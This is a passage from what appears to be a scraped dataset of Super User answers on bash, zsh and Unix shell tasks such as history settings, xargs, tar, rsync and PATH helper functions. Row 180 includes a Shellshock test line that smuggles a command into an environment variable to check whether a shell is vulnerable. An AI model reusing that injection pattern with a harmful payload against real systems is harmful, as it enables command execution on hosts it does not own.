<code>head</code>, <code>type</code>, <code>type</code>, <code>type</code>, <code>type</code>, <code>type</code>, <code>type</code>, <code>type</code>, <code>rvm</code>]"
170,https://superuser.com/questions105499/,"['This article tells you how.', 'Essentially, you use character sequences echoed to the screen to inform the terminal of what title it should display.', ""In the above example, whatever the variable title is set to while become the terminal's title. Of course, you could just have the title in the string to echo such as:"", 'But the first way makes it a slightly bit easier to use and/or extend later.']","[<code>title='My first title'
echo -n -e ""\033]0;$title\007""
</code>, <code>echo -n -e ""\033]0;My first title\007""
</code>]"
171,https://superuser.com/questions627929/,"[""I've never used fish myself but a cursory google search brought up this page which states that"", 'Powerful History Mechanism', 'Modern shells save previous commands in a command history. You can view earlier commands by using the up and down arrows. Fish extends this concept by integrating the history search functionality. To search the history, simply type in the search string, and press the up arrow. By using the up and down arrow, you can search for older and newer matches. The fish history automatically removes duplicate matches and the matching substring is highlighted. These features make searching and reusing previous commands much faster.', ""Is that what you are looking for? It seems quite similar to bash's.""]",[<code>fish</code>]
172,https://superuser.com/questions1220872/,"['Ironically, the solution is to call sudo from an alias. ', 'Note: While not recommended, you could name the alias sudo: alias sudo=""sudo ""', 'Bash Reference Manual (Aliases)', 'If the last character of the alias value is a blank, then the next\n  command word following the alias is also checked for alias expansion. ']","[<code>sudo</code>, <code>alias sd=""sudo ""
</code>, <code>sudo</code>, <code>alias sudo=""sudo ""</code>]"
173,https://superuser.com/questions195826/,"['If a script /path/to/foo begins with #!/bin/bash, then executing /path/to/foo arg1 arg2 is equivalent to executing /bin/bash /path/too/foo arg1 arg2. If the shebang line is #!/bin/bash -ex, it is equivalent to executing /bin/bash -ex /path/too/foo arg1 arg2. This feature is managed by the kernel.', 'Note that you can portably have only one argument on the shebang line: some unices (such as Linux) only accept one argument, so that #!/bin/bash -e -x would lead to bash receiving the single five-character argument -e -x (a syntax error) rather than two arguments -e and -x.', 'For the Bourne shell sh and derived shells such as POSIX sh, bash, ksh, and zsh:', 'Other programs may understand these options but with different meanings.']","[<code>/path/to/foo</code>, <code>#!/bin/bash</code>, <code>/path/to/foo arg1 arg2</code>, <code>/bin/bash /path/too/foo arg1 arg2</code>, <code>#!/bin/bash -ex</code>, <code>/bin/bash -ex /path/too/foo arg1 arg2</code>, <code>#!/bin/bash -e -x</code>, <code>-e -x</code>, <code>-e</code>, <code>-x</code>, <code>sh</code>, <code>-e</code>, <code>-x</code>]"
174,https://superuser.com/questions33914/,"['I cannot tell you why it does not support that argument (you may have to ask the programmers about that).\nI only know that on my linux box, I get this:', ""As for workarounds (thats more interesting):\nNot using /bin/echo, but bash's builtin echo works on linux boxes. If they changed to a bash without builtin echo (or something even more obscure), you could also try this not widely known feature of your shell (works at least in bash and zsh):"", ""This is the matching part of bash's manpage:""]","[<code>$ /bin/echo --help
Usage: /bin/echo [SHORT-OPTION]... [STRING]...
  or:  /bin/echo LONG-OPTION
Echo the STRING(s) to standard output.

  -n             do not output the trailing newline
  -e             enable interpretation of backslash escapes
  -E             disable interpretation of backslash escapes (default)
      --help     display this help and exit
      --version  output version information and exit

If -e is in effect, the following sequences are recognized:
*emphasized text*
  \0NNN   the character whose ASCII code is NNN (octal)
  \\     backslash
  \a     alert (BEL)
  \b     backspace
  \c     produce no further output
  \f     form feed
  \n     new line
  \r     carriage return
  \t     horizontal tab
  \v     vertical tab

NOTE: your shell may have its own version of echo, which usually supersedes
the version described here.  Please refer to your shell's documentation
for details about the options it supports.

Report echo bugs to bug-coreutils@gnu.org
GNU coreutils home page: &lt;http://www.gnu.org/software/coreutils/&gt;
General help using GNU software: &lt;http://www.gnu.org/gethelp/&gt;
Report echo translation bugs to &lt;http://translationproject.org/team/&gt;
</code>, <code>\e</code>, <code>/bin/echo</code>, <code>/bin/echo</code>, <code>/bin/echo</code>, <code>echo</code>, <code>$ echo $'\e[34m''COLORS'
</code>, <code>   Words  of  the  form  $'string' are treated specially.  The word expands to string, with
   backslash-escaped characters replaced as specified by the ANSI  C  standard.   Backslash
   escape sequences, if present, are decoded as follows:
          \a     alert (bell)
          \b     backspace
          \e     an escape character
          \f     form feed
          \n     new line
          \r     carriage return
          \t     horizontal tab
          \v     vertical tab
          \\     backslash
          \'     single quote
          \nnn   the  eight-bit  character whose value is the octal value nnn (one to three
                 digits)
          \xHH   the eight-bit character whose value is the hexadecimal value  HH  (one  or
                 two hex digits)
          \cx    a control-x character

   The expanded result is single-quoted, as if the dollar sign had not been present.

   A  double-quoted string preceded by a dollar sign ($) will cause the string to be trans‐
   lated according to the current locale.  If the current locale is C or POSIX, the  dollar
   sign  is  ignored.  If the string is translated and replaced, the replacement is double-
   quoted.
</code>]"
175,https://superuser.com/questions93385/,"['Use the sudo command in the script. ', 'In the form:', 'the sudo command runs command as the user username.', ""If the script is being run as root, I don't think it will prompt for a password. Otherwise, this article discusses how to use sudo with password in one command line?, and this article discusses how to use sudo without password?""]","[<code>sudo -u username command
</code>]"
176,https://superuser.com/questions305933/,['Run the command in a subshell:'],"[<code>(sleep 2 &amp;)
</code>]"
177,https://superuser.com/questions437663/,"['Type:', 'That sets the access and modification times of TOFILE to match FROMFILE.', ""It will also update TOFILE's ctime to the current time."", ""There's no way to update the ctime (inode change time) to match another file, only to the current system time.  (Which you can change if you really need to set the ctime, or use debugfs on an unmounted ext2/3/4 filesystem.  See more on Stack Overflow)""]","[<code>touch -r FROMFILE TOFILE
</code>, <code>debugfs</code>]"
178,https://superuser.com/questions507576/,"['The easiest way would be to add it to /etc/inittab, which is designed to do this sort of thing:', 'respawn\n  If the process does not exist, start the process. Do not wait for its termination (continue scanning the /etc/inittab file). Restart the process when it dies. If the process exists, do nothing and continue scanning the /etc/inittab file.', 'For example, you could do this:']","[<code># Run my stuff
myprocess:2345:respawn:/bin/myprocess
</code>]"
179,https://superuser.com/questions403800/,"[""It's not an issue with backticks substitution, but with echo; you have to quote the variable to get the control characters working:""]","[<code>echo</code>, <code>$ var=`echo line one &amp;&amp; echo line two`
$ echo ""$var""
line one
line two
</code>]"
180,https://superuser.com/questions816622/,"[""No, it doesn't affect ZSH."", 'You still MUST update bash as most of the system scripts are written for bash and vulnerable to the shellshock bug.', 'To test your ZSH do this:', 'What exactly does this code do? ', 'If you see output:', 'Then your ZSH is vulnerable. Mine (5.0.2) is not:']","[<code>env x='() { :;}; echo vulnerable' zsh -c 'echo hello'
</code>, <code>env x='() { :;}; echo vulnerable'</code>, <code>zsh -c 'echo hello'</code>, <code>vulnerable
hello
</code>, <code>$ env x='() { :;}; echo vulnerable' zsh -c 'echo hello'
hello
</code>]"
181,https://superuser.com/questions180251/,"['Try using xargs:', 'Update:', ""I did this on OS X which has an different version than GNU/Linux versions. The xargs which comes from GNU findutils doesn't have -J but it has -I which is similar (as Dennis Williamson pointed out in a comment). The OS X version of xargs has both -I and -J which have slightly different behaviors -- either will work for this original question.""]","[<code>cat list.txt | xargs -J % cp % new_folder
</code>, <code>xargs</code>, <code>-J</code>, <code>-I</code>, <code>-I</code>, <code>-J</code>, <code>$ cat list.txt
one
two.txt
three.rtf

$ cat list.txt | xargs -J % echo cp % new_folder
cp one two.txt three.rtf new_folder

$ cat list.txt | xargs -I % echo cp % new_folder
cp one new_folder
cp two.txt new_folder
cp three.rtf new_folder
</code>]"
182,https://superuser.com/questions458326/,"['Thanks to this SO post —', ""Warning: This code is untested! Edit this question if it's wrong and you can fix it; I'll approve your edit.""]","[<code>find . -type f \( -exec sha1sum ""$PWD""/{} \; \) | sha1sum
</code>]"
183,https://superuser.com/questions256023/,"['Just type bc into the terminal. Then type all the math stuff in after that.', 'bc stands for ""basic calculator"" ', 'Then type quit and enter to exit.']","[<code>bc</code>, <code>bc</code>, <code>quit</code>]"
184,https://superuser.com/questions37576/,"['There are two things you need to do:', 'EDIT: Thanks to e-t172 for the history -n trick']","[<code>shopt -s histappend</code>, <code>.bashrc</code>, <code>.bashrc</code>, <code>PROMPT_COMMAND=""$PROMPT_COMMAND;history -a; history -n""</code>, <code>history -n</code>]"
185,https://superuser.com/questions207450/,"['Use:', 'or:', 'where . is a regex that means: ""any character"".']","[<code>apropos .
</code>, <code>man -k .
</code>, <code>.</code>]"
186,https://superuser.com/questions334272/,"['You can separate multiple commands by ;, so they are executed sequentially, for example:', 'If you wish to execute next program only if the script finished with return-code 0 (which usually means it has executed correctly), then:', 'If you want the opposite (i.e. continue only if current command has failed), than:', 'You could run your script in a background (but beware, scripts output (stdout and stderr) would continue to go to your terminal unless you redirect it somewhere), and then wait for it:', 'If you have already run script, you could suspend it with Ctrl-Z, and then execute something like:', 'Where fg brings the suspended process to foreground (bg would make it run in background, pretty much like started with &)']","[<code>;</code>, <code>really_long_script.sh ; echo Finished
</code>, <code>really_long_script.sh &amp;&amp; echo OK
</code>, <code>really_long_script.sh || echo FAILED
</code>, <code>stdout</code>, <code>stderr</code>, <code>wait</code>, <code>really_long_script.sh &amp;
dosomethingelse
wait; echo Finished
</code>, <code>Ctrl-Z</code>, <code>fg ; echo Finished
</code>, <code>fg</code>, <code>bg</code>, <code>&amp;</code>]"
187,https://superuser.com/questions8716/,"['Or, you could use pure bash... (except for mv, that is..)', 'and avoid the nasty basename stuff. ;)', ""Bash has an extensive set of variable expansion options. The one used here, '%', removes the smallest matching suffix from the value of the variable. The pattern is a glob pattern, so ${file%.*} would also work. The '%%' operator removes the largest matching suffix, and is interchangeable in the example above, as the pattern is fixed, ${file%%.*}.html would turn a.b.htm into a.html though."", ""See the variable substition section of the bash manpage for more neat tricks. There's a lot that can be done within bash directly.""]","[<code>for file in *.htm; do mv ""$file"" ""${file%.htm}.html""; done
</code>, <code>${file%.*}</code>, <code>${file%%.*}.html</code>]"
188,https://superuser.com/questions59497/,"['Buffering is the problem.', 'Do it this way,', 'Confirmed to work on Cygwin too.  ']",[]
189,https://superuser.com/questions79338/,"['Something like this might do what you want, though it takes a slightly different approach:']","[<code>pdftk $(for n in {1..18}; do echo cwcch$n.pdf; done) cat output output.pdf
</code>]"
190,https://superuser.com/questions680119/,"[""Quicker is not necessarily what you want. You may want to actually run slower, so the deletion chews up fewer resources while it's running."", 'Use nice(1) to lower the priority of a command.', 'For I/O-bound processes nice(1) might not be sufficient. The Linux scheduler does take I/O into account, not just CPU, but you may want finer control over I/O priority.', ""If that doesn't do it, you could also add a sleep to really slow it down.""]","[<code>nice find . -name ""*.gif"" -delete
</code>, <code>ionice -c 2 -n 7 find . -name ""*.gif"" -delete
</code>, <code>find . -name ""*.gif"" -exec sleep 0.01 \; -delete
</code>]"
191,https://superuser.com/questions198015/,"[""Once gnome-terminal has started bash, it's out of the loop as far as command execution is concerned: it only manages the input and output. So you'll need bash's cooperation to run something after ~/.bashrc has been loaded."", ""First, in many cases, you don't actually need to execute commands after ~/.bashrc. For example, opening a terminal in a particular directory can simply be done with cd /foo/bar && gnome-terminal. You can set environment variables in a similar way: VAR=value gnome-terminal. (If your ~/.bashrc overrides environment variables, you're doing it wrong: environment variable definitions belong in ~/.profile)"", 'To execute commands in the terminal, but before ~/.bashrc, you can do', 'If you want to use multiple tabs, you have to use -e instead of -x. Gnome-terminal unhelpfully splits the argument of -e at spaces rather than executing it through a shell. Nonetheless, you can write a shell command if you make sure not to include spaces in it. At least with gnome-terminal 2.26, you can use tabs, though (replace <TAB> by a literal tab character):', 'If you do need to run commands after ~/.bashrc, make it run the commands. For example, include the following code at the end of ~/.bashrc:', 'Then to run a some code after (really, at the end of) your bashrc:', 'or (less heavy on the quoting)', ""Although I don't particularly recommend doing it this way, you may be interested in the techniques mentioned in\nHow to start a terminal with certain text already input on the command-line?.""]","[<code>~/.bashrc</code>, <code>~/.bashrc</code>, <code>cd /foo/bar &amp;&amp; gnome-terminal</code>, <code>VAR=value gnome-terminal</code>, <code>~/.bashrc</code>, <code>~/.profile</code>, <code>~/.bashrc</code>, <code>gnome-terminal -x sh -c 'command1; command2; exec bash'
</code>, <code>-e</code>, <code>-x</code>, <code>-e</code>, <code>&lt;TAB&gt;</code>, <code>gnome-terminal -e 'sh -c command1;command2;exec&lt;TAB&gt;bash'
gnome-terminal --tab -e 'sh -c command1;&lt;TAB&gt;exec&lt;TAB&gt;bash' \
               --tab -e 'sh -c command2;&lt;TAB&gt;exec&lt;TAB&gt;bash'
</code>, <code>~/.bashrc</code>, <code>~/.bashrc</code>, <code>eval ""$BASH_POST_RC""
</code>, <code>gnome-terminal -x sh -c BASH_POST_RC=\''command1; command2'\''; exec bash'
</code>, <code>BASH_POST_RC='command1; command2' gnome-terminal
</code>]"
192,https://superuser.com/questions215950/,"['You can use the glob-expand-word function, from man bash:', 'Add something like this to your ~/.inputrc:', 'So $ ls * followed by Ctrl-X will expand to $ ls a b c, in your example.']","[<code>glob-expand-word</code>, <code>bash</code>, <code>~/.inputrc</code>, <code>Control-x: glob-expand-word
</code>, <code>$ ls *</code>, <code>$ ls a b c</code>]"
193,https://superuser.com/questions106272/,"['One way to do this, that involves a bit more typing, is via the source command. To call a function from myFunc you could use source myFunc; ls2 and it would output Hello World.', 'So for example, I have a file called say.sh:', ""now I want to call it's talk() function from the command line:"", 'to call it from another bash script:', 'You can also put each in a separate script and add them in a directory which is in your PATH variable.', ""so for example, in one script called hello you'd have:"", ""now put it in one of the directories in your PATH, which you can view by running echo $PATH. You can add another directory to your PATH if you'd like or use an existing one. Once you've copied the file there, make it executable with chmod +x filename.""]","[<code>source</code>, <code>source myFunc; ls2</code>, <code>say.sh</code>, <code>#!/bin/bash

function talk()
{
        echo ""hi!""
}
</code>, <code>talk()</code>, <code>#!/bin/bash
source say.sh
talk
</code>, <code>hello</code>, <code>#!/bin/bash
echo ""Hello World""
</code>, <code>echo $PATH</code>, <code>chmod +x filename</code>]"
194,https://superuser.com/questions135651/,['history -s command'],[<code>history -s</code>]
195,https://superuser.com/questions188865/,"[""Note that this has nothing to do with bash (once you've launched the command, bash just waits for it to finish) and everything to do with the terminal."", 'Most terminal emulators wrap at the right margin by default. But this can be turned off by using the appropriate control sequence, if the terminal emulator supports it; then long lines are simply truncated:']","[<code>printf '\033[?7l'
ls -l /a/folder/that/contains/files/with/long/names
printf '\033[?7h'
</code>]"
196,https://superuser.com/questions303559/,"['For some definitions of ""easy"":', 'Run this script with link names as arguments, e.g. through find . -type l -exec /path/tos/script {} +']","[<code>#!/bin/sh
set -e
for link; do
    test -h ""$link"" || continue

    dir=$(dirname ""$link"")
    reltarget=$(readlink ""$link"")
    case $reltarget in
        /*) abstarget=$reltarget;;
        *)  abstarget=$dir/$reltarget;;
    esac

    rm -fv ""$link""
    cp -afv ""$abstarget"" ""$link"" || {
        # on failure, restore the symlink
        rm -rfv ""$link""
        ln -sfv ""$reltarget"" ""$link""
    }
done
</code>, <code>find . -type l -exec /path/tos/script {} +</code>]"
197,https://superuser.com/questions289539/,"['Write a bash completion script for cooltool. The bash-completion package comes with scripts for many popular programs, which you can use as examples.']",[<code>cooltool</code>]
198,https://superuser.com/questions461946/,['Command substitution.'],"[<code>./Myscript.sh ""$(cat text.txt)""
</code>]"
199,https://superuser.com/questions939746/,"['Another solution is to use Process Substitution in Bash. If your system has named pipes, you can use this feature.', 'It is used like this:', 'where list is a sequence of shell commands (actually pipelines; the full details are here). list will be executed, and its output will be connected to the pipe. The name of the pipe is then passed to your program.', 'NOTE: spaces are not allowed between < and (.', ""(The other substitution >(list) also works as you'd expect.)"", 'In your specific case, you could use', ""although you may find @meuh's solution to be more elegant."", 'Update: A great many usage examples are to be found over at the Advanced Bash Scripting Guide.']","[<code>program_expecting_a_file &lt;(list)
</code>, <code>list</code>, <code>list</code>, <code>&lt;</code>, <code>(</code>, <code>&gt;(list)</code>, <code>program_expecting_a_file &lt;(echo ""$your_strings"")
</code>]"
200,https://superuser.com/questions163515/,"['You can either:', 'EDIT: As some have pointed out, double-quoting does not prevent variable expansion nor command substitution. Therefore if your regex contains something that can be interpreted by bash as one of those, use single quotes instead.']","[<code>\[abc\]_\[x\|y\]</code>, <code>""[abc]_[x|y]""</code>]"
201,https://superuser.com/questions593694/,"['Try it like this:', 'You can also do:', 'This will send the output to the ""uselessfile"" file instead of to STDOUT. ', 'You can also append instead of creating or overwriting the file.']","[<code>cd - &gt; /dev/null
</code>, <code>cd - &gt; uselessfile
</code>, <code>cd - &gt;&gt; uselessfile
</code>]"
202,https://superuser.com/questions1323645/,"[""If you're referencing files in the Windows file system, they do not, by default, retain Linux permissions.\nHowever, there's a way to enable that. Edit or create (using sudo) /etc/wsl.conf and add the following:"", 'Shut down all WSL instances and restart an instance, and any chmod changes are now retained.']","[<code>sudo</code>, <code>/etc/wsl.conf</code>, <code>[automount]
options = ""metadata""
</code>, <code>chmod</code>]"
203,https://superuser.com/questions187106/,"[""If you're aiming for portability, beware that there are several different versions of mail(1) and mailx(1). There's a POSIX mailx command, but with very few requirements. And none of the implementations I have seem to parse attachments anyway."", 'You might have the mpack package. Its munpack command saves all parts of a MIME message into separate files, then all you have to do is save the interesting parts and clean up the rest.', ""There's also metamail. An equivalent of munpack is metamail -wy.""]","[<code>mail(1)</code>, <code>mailx(1)</code>, <code>mailx</code>, <code>munpack</code>, <code>munpack</code>, <code>metamail -wy</code>]"
204,https://superuser.com/questions168578/,"[""Since you can't 'execute' a directory, the execute bit has been put to better use. The execute bit on a directory allows you to access items that are inside the directory, even if you cannot list the directories contents."", 'From the chmod manpage:', 'The letters rwxXst select file mode bits for the affected users: read (r), write (w), execute (or search for directories) (x), execute/search only if the file is a directory or already has execute permission for some user (X), set user or group ID on execution (s), restricted deletion flag or sticky bit (t).']","[<code>$ mkdir -p dir/
$ echo 'Hello World!' &gt; dir/file
$ chmod 000 dir/
$ ls -al dir/
ls: cannot open directory dir: Permission denied
$ cat dir/file
cat: dir/file: Permission denied
$ chmod +x dir/
$ ls -al dir/
ls: cannot open directory dir: Permission denied
$ cat dir/file
Hello World!
</code>, <code>chmod</code>]"
205,https://superuser.com/questions86184/,"['You can use scutil interactively from the terminal. Run sudo scutil and run these commands, swapping your DNS servers in where appropriate:', 'Instead of using 8.8.8.8 and 9.9.9.9 use your DNS servers.', ""The only problem is this is not persistent across reboots. If you want permanent changes, you'll want ncutil. The reason editing /etc/resolv.conf isn't sufficient in newer versions of OS X is because configd now uses a database to store information of current settings, which other applications read. Certain applications will still read /etc/resolv.conf (host for example), although that is not the case for all applications.""]","[<code>scutil</code>, <code>sudo scutil</code>, <code>8.8.8.8</code>, <code>9.9.9.9</code>, <code>/etc/resolv.conf</code>, <code>/etc/resolv.conf</code>]"
206,https://superuser.com/questions424774/,"['will list the contents line by line.', ""This can be piped to xargs directly, but beware: do the deletion very carefully. You don't want to just rm -r everything that tar tf tells you, since it might include directories that were not empty before unpacking!"", 'You could do', 'to first remove all files that were in the archive, and then the directories that are left empty.', ""sort -r (glennjackman suggested tac instead of sort -r in the comments to the accepted answer, which also works since tar's output is regular enough) is needed to delete the deepest directories first; otherwise a case where dir1 contains a single empty directory dir2 will leave dir1 after the rmdir pass, since it was not empty before dir2 was removed."", 'This will generate a lot of ', 'and', ""Shut this up with 2>/dev/null if it annoys you, but I'd prefer to keep as much information on the process as possible."", ""And don't do it until you are sure that you match the right files. And perhaps try rm -i to confirm everything. And have backups, eat your breakfast, brush your teeth, etc.""]","[<code>tar tf archive.tar
</code>, <code>xargs</code>, <code>rm -r</code>, <code>tar tf</code>, <code>tar tf archive.tar | xargs -d'\n' rm -v
tar tf archive.tar | sort -r | xargs -d'\n' rmdir -v
</code>, <code>sort -r</code>, <code>tac</code>, <code>sort -r</code>, <code>tar</code>, <code>dir1</code>, <code>dir2</code>, <code>dir1</code>, <code>rmdir</code>, <code>dir2</code>, <code>rm: cannot remove `dir/': Is a directory
</code>, <code>rmdir: failed to remove `dir/': Directory not empty
rmdir: failed to remove `file': Not a directory
</code>, <code>2&gt;/dev/null</code>, <code>rm -i</code>]"
207,https://superuser.com/questions375223/,"['Use a loop:', 'Instead of :, you can use sleep 1 (or 0.2) to ease the CPU.', 'The loop runs until grep finds the string in the command\'s output. -m 1 means ""one match is enough"", i.e. grep stops searching after it finds the first match.', 'You can also use grep -q which also quits after finding the first match, but without printing the matching line.']","[<code>until my_cmd | grep -m 1 ""String Im Looking For""; do : ; done
</code>, <code>:</code>, <code>sleep 1</code>, <code>-m 1</code>, <code>grep -q</code>]"
208,https://superuser.com/questions1241654/,"['The builtin command makes sure you run the shell built-in version of the command rather than running another command with the same name. ', ""For example, let's say you defined a shell function named cd to print some extra status everytime you change directories. But you messed it up and now you can't change directories correctly. So now you can type builtin cd ~ to successfully cd back to your home directory without running your broken shell function. "", 'And by the way, my copy of the bash man page has a section called ""SHELL BUILTIN COMMANDS"", and it defines the meaning of the builtin command in that section (transcribed below).']","[<code>builtin</code>, <code>cd</code>, <code>builtin cd ~</code>, <code>builtin</code>]"
209,https://superuser.com/questions1000867/,"['I use a set of convenience functions for prepending or appending a path to a variable. The functions come in the distribution tarball for Bash in a contrib file called ""pathfuncs"".', 'If you specify a variable as the second argument, it will use that instead of PATH.', 'For convenience, here they are:', 'If you add those to your bash startup file, you can add to your PATH like this:', 'Or specify a different variable:', 'I use this method in my rc files putting the pre_paths first and the add_paths second. It makes all of my path changes easy to understand at a glance. Another benefit is that the lines are short enough that I can add a trailing comment on a line if necessary.', 'And since these are functions, you can use them interactively from the command line, such as by saying add_path $(pwd) to add the current directory to the path.']","[<code># is $1 missing from $2 (or PATH) ?
no_path() {
    eval ""case :\$${2-PATH}: in *:$1:*) return 1;; *) return 0;; esac""
}
# if $1 exists and is not in path, append it
add_path () {
  [ -d ${1:-.} ] &amp;&amp; no_path $* &amp;&amp; eval ${2:-PATH}=""\$${2:-PATH}:$1""
}
# if $1 exists and is not in path, prepend it
pre_path () {
  [ -d ${1:-.} ] &amp;&amp; no_path $* &amp;&amp; eval ${2:-PATH}=""$1:\$${2:-PATH}""
}
# if $1 is in path, remove it
del_path () {
  no_path $* || eval ${2:-PATH}=`eval echo :'$'${2:-PATH}: |
    sed -e ""s;:$1:;:;g"" -e ""s;^:;;"" -e ""s;:\$;;""`
}
</code>, <code>pre_path $HOME/bin
add_path /sbin
add_path /usr/sbin
</code>, <code>pre_path $HOME/man MANPATH
pre_path $HOME/share/man MANPATH
add_path /usr/local/man MANPATH
add_path /usr/share/man MANPATH
</code>, <code>add_path $(pwd)</code>]"
210,https://superuser.com/questions103069/,"['Add these two lines to your ~/.inputrc file on the destination machine:', 'To make sure that they are the correct sequences, at a Bash prompt, type Ctrl-V Ctrl-LeftArrow and Ctrl-V Ctrl-RightArrow, you should see:', 'When you start a new session, the keys will be available or you can press Ctrl-xCtrl-r to re-read the ~/.inputrc file for the current session.']","[<code>~/.inputrc</code>, <code>""\eOD"": backward-word
""\eOC"": forward-word
</code>, <code>^[OD^[OC
</code>, <code>~/.inputrc</code>]"
211,https://superuser.com/questions423980/,"[': is a shell builtin that is basically equivalent to the true command. It is often used as a no-op eg after an if statement. You can read more about it in this question from stack overflow.', 'The ${varname=value} basically means set the value of $varname to value if $varname is not already set, and then return the value of $varname. Though if you try to run that at the command line it will try to run the value returned. Putting the : in front as a no-op prevents bash from trying to run the value.', 'Note there are two slightly different forms:', 'sets varname to value if varname is either unset or null. ', 'only sets the value of varname if varname is currently unset (i.e., it will not change varname from """" to value)', '(Thank you to chepner for clarifying that in a comment).', 'Someone else referencing this method']","[<code>:</code>, <code>true</code>, <code>if</code>, <code>${varname=value}</code>, <code>$varname</code>, <code>value</code>, <code>$varname</code>, <code>:</code>, <code>${varname:=value}
</code>, <code>${varname=value}
</code>]"
212,https://superuser.com/questions202645/,"['On linux systems, you should have readlink from the GNU coreutils project installed and can do this:', 'Debian/ubuntu systems may have the realpath utility installed which ""provides mostly the same functionality as /bin/readlink -f in the coreutils package.""']","[<code>readlink</code>, <code>readlink -f file.ext
</code>, <code>/bin/readlink -f</code>]"
213,https://superuser.com/questions537619/,"['To and expressions with grep you need two invocations:', 'If the terms you are searching for are not regular expressions, use fixed string matching (-F) which is faster:']","[<code>grep -Ei ""search term"" | grep -Eiv ""exclude term""
</code>, <code>-F</code>, <code>grep -F ""search term"" | grep -Fv ""exclude term""
</code>]"
214,https://superuser.com/questions288714/,"['I use ', 'to achieve it']","[<code>bind 'TAB:menu-complete'
</code>]"
215,https://superuser.com/questions609564/,"[""If it's a local machine, start a new terminal and kill the shell in question."", ""If it's a remote machine, ssh in and kill the shell in question.""]",[]
216,https://superuser.com/questions39603/,"['Use head:', '10 lines is the default. Read the head man page for more options. ', '(older versions of head also support usage without the explicit -n as in head -15)']","[<code>ls -l | head -n 15
</code>, <code>-n</code>, <code>head -15</code>]"
217,https://superuser.com/questions82445/,['You can use scp to copy to a remote machine.'],"[<code>scp</code>, <code>scp &lt;file to upload&gt; &lt;username&gt;@&lt;hostname&gt;:&lt;destination path&gt;
</code>]"
218,https://superuser.com/questions347505/,"['This used to be posted in the Usenet FAQs for Unix—I see it is in the GNU Core Utility FAQs.  There were at least five different methods, but this works well:', 'If a filename contains untypeable characters, then use:', 'The -i flag asks for confirmation for each file if it should be removed or not.']","[<code>$ rm ./-
</code>, <code>$ rm -i *
</code>, <code>-i</code>]"
219,https://superuser.com/questions238791/,['Put the pipes at the end of line with the comments after it:'],"[<code>$ echo 'foo' |
sed 's/f/a/' | # change first f to a
sed 's/o/b/' | # change first o to b
sed 's/o/c/'   # change second o to c
abc
</code>]"
220,https://superuser.com/questions735660/,"[""The simplest approach to emulate bash's $PROMPT_COMMAND which comes to my mind is to use the precmd hook, as you already figured out. Define it as"", 'and you can do something like that:', 'Please note the single quotes in that example, otherwise $(date) will get expanded too early, i.e. already when defining $PROMPT_COMMAND and not when called before the prompt.', ""If you want to preserve (and don't want to alter) the existing definition, you can use that approach:"", 'With that the prmptcmd functions is executed after the existing precmd() function.', 'Finally, here is a way which is suitable for use in a program package, which neither should modify user or system files nor can enter the commands interactive.', 'An example to spawn a bash session could be', 'To spawn zsh you can use', ""which causes /program/dir/.zshrc to be sourced. In this file the precmd() hook can be defined as explained above. If you want the user's settings in addition include source $HOME/.zshrc etc. in the program's .zshrc, too.\nThis setup is maintainable, as no files outside the program directory are modified."", 'As a last addition, here is a proof of concept how to keep the newuser welcome, too. Use the following code in your /program/dir/.zshenv rc config file:']","[<code>$PROMPT_COMMAND</code>, <code>precmd</code>, <code>precmd() { eval ""$PROMPT_COMMAND"" }
</code>, <code>$ PROMPT_COMMAND='echo Hello, it is now $(date)'
Hello, it is now Mon, Mar 31, 2014 7:08:00 PM
$ whoami      
user
Hello, it is now Mon, Mar 31, 2014 7:08:21 PM     
$
</code>, <code>$(date)</code>, <code>$PROMPT_COMMAND</code>, <code>$ prmptcmd() { eval ""$PROMPT_COMMAND"" }
$ precmd_functions=(prmptcmd)
</code>, <code>prmptcmd</code>, <code>precmd()</code>, <code>PROMPT_COMMAND=""echo foo"" bash
</code>, <code>ZDOTDIR=/program/dir zsh
</code>, <code>/program/dir/.zshrc</code>, <code>precmd()</code>, <code>source $HOME/.zshrc</code>, <code>/program/dir/.zshenv</code>, <code>echo define precmd, traps, etc.

autoload -Uz zsh-newuser-install

if [[ ! -e ""$HOME/.zshrc"" ]]; then
  zsh-newuser-install -f
  mv $ZDOTDIR/.zshrc $HOME/.zshrc
else
  builtin source $HOME/.zshrc
fi
</code>]"
221,https://superuser.com/questions295994/,"[""Escape the space, e.g. Spring\\ 2011, or use quotes, e.g. 'Spring 2011'. In the future, it's typically a bad idea to use file names with spaces in them on any *NIX."", ""If you've got rename, you can use this:""]","[<code>Spring\ 2011</code>, <code>'Spring 2011'</code>, <code>rename</code>, <code>rename ' ' '_' [filenames...]
</code>]"
222,https://superuser.com/questions719531/,"['Alt-Up arrow gives you the last argument from the previous command. Subsequent pushes cycle throught prior arguments.', ""I haven't found a satisfactory equivalent to !!, except Up then Ctrl-A""]",[<code>!!</code>]
223,https://superuser.com/questions105231/,"['This would be significantly easier using rsync with its --exclude switch.', 'The -v switch will provide verbose output on which files are being synchronised.']","[<code>--exclude</code>, <code>rsync -av --exclude='*.FOO' --exclude='*.BAR' --exclude='*.ZIM' /source /dest
</code>, <code>-v</code>]"
224,https://superuser.com/questions546761/,"['As a regular user, you can change your default login shell using the chsh command. Here is an example:', 'Another option is to use usermod as root:']","[<code>chsh</code>, <code>chsh -s /bin/bash
</code>, <code>usermod -s /bin/bash username
</code>]"
225,https://superuser.com/questions543793/,"['Something like this:', '-eq is for number comparison, use = for string comparison']","[<code>act=""add""
if [[ $act = ""add"" ]]
then
    echo good
else
    echo not good
fi
</code>, <code>-eq</code>, <code>=</code>]"
226,https://superuser.com/questions382456/,['Somewhere your prompt is fubar. What usually happens is that your shell thinks its outputting non-printable term codes and expecting it to take up space.  The best advice I can give you is to systematically add to (or take away from) your prompt until this behavior stops to isolate the code that is causing this issue.'],[]
227,https://superuser.com/questions335396/,"['From the bash man page:', 'Read the redirection section of the bash man page.']","[<code>bash man</code>, <code>There  are  two  formats  for  redirecting standard output and standard
   error:

          &amp;&gt;word
   and
          &gt;&amp;word

   Of the two forms, the first is preferred.  This is semantically equiva-
   lent to

          &gt;word 2&gt;&amp;1
</code>, <code>redirection section</code>]"
228,https://superuser.com/questions419670/,"['Use the bind command:', 'See help bind for more information:']","[<code>bind</code>, <code>bind -f ~/.inputrc
</code>, <code>help bind</code>, <code>-f  filename       Read key bindings from FILENAME.
</code>]"
229,https://superuser.com/questions345376/,"['The same -f - option works for tarring as well.', 'GNU tar uses stdio by default:', 'rsync is also popular.']","[<code>-f -</code>, <code>tar -cf - something | tar -C somefolder -xvf -
</code>, <code>tar -c something | tar -C somefolder -xv
</code>, <code>rsync -av something/ somefolder/
</code>]"
